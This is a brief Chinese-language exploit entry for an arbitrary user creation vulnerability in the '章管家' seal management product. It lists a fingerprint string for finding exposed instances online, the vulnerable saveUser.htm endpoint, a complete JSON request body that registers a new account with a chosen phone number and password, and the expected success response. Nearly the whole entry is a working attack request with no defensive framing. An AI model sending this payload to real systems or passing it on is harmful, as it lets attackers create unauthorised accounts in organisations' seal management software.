# 章管家saveUser.htm任意用户创建漏洞

章管家saveUser.htm任意用户创建 ｜ 其他 ｜ —
- **指纹**：`body="章管家登录-公章在外防私盖"`
- **请求**：`POST /api/personSeal_jdy/saveUser.htm HTTP/1.1`

**Payload**
```
{"op":{},"data":{"mobile":"14333333333","uid":"14333333333","password":"123456","name":"ceshi","return_url":"https://www.baidu.com","apisecretkey":"1","_id":"1","mail_address":"111@qq.com"},"b7o4ntosbfp":"="}
```
- **响应特征**：200 200